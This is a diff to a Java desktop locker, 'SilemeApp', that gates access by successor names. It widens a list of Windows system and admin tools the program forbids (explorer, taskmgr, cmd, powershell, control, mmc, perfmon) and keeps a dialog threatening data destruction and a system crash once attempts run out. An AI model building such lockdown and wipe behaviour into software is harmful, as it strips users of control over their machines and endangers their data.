@@ -20,7 +20,7 @@ public class SilemeApp {
     
     //要禁止的进程列表
     private static final String[] FORBIDDEN_PROCESSES = {
-        "explorer.exe", "taskmgr.exe", "cmd.exe", "powershell.exe"
+        "explorer.exe", "taskmgr.exe", "cmd.exe", "powershell.exe", "control.exe", "mmc.exe", "perfmon.exe"
     };
     
     public static void main(String[] args) {
@@ -273,7 +273,7 @@ public class SilemeApp {
         updateContent(frame, panel);
     }
     
-    //选择可执行文件屏幕
+    //选择可执行文件屏幕(ver1.2 add)
     private void showExecutableSelectionScreen(JFrame frame) {
         JPanel panel = new JPanel(new BorderLayout());
         
@@ -547,10 +547,22 @@ public class SilemeApp {
             if (inputName != null && config.successorNames.contains(inputName.trim())) {
                 //身份验证成功
                 
-                //I love GJJ
+                //个人表白，release中的jar包均包含这些代码，不需要的可以删去后再编译
                 if ("顾俊杰".equals(inputName.trim())) {
-                    System.out.println("GJJ I Love You");
+                    System.out.println("GJJ I want to be your friend FOREVER");
                 }
+
+                if ("孙政宏".equals(inputName.trim())) {
+                    System.out.println("SCH I Love You");
+                }
+
+
+                if ("陶嘉羽".equals(inputName.trim())) {
+                    System.out.println("TJY I want to be your friend FOREVER");
+                }
+
+                
+                //表白内容结束
                 
                 JOptionPane.showMessageDialog(frame, 
                     "<html><b>身份验证成功！</b><br><br>"
@@ -620,7 +632,7 @@ public class SilemeApp {
         
         if (config.remainingAttempts <= 0) {
             JOptionPane.showMessageDialog(frame, 
-                "尝试次数已耗尽！将执行数据销毁程序并崩溃系统，你明明可以进入pe删除启动脚本的，给你机会你不中用啊。", 
+                "尝试次数已耗尽！将执行数据销毁程序并崩溃系统，你明明可以进入pe删除文件的，给你机会你不中用啊。", 
                 "严重警告", JOptionPane.WARNING_MESSAGE);
             
             //尝试次数耗尽时不恢复explorer（非正常退出）
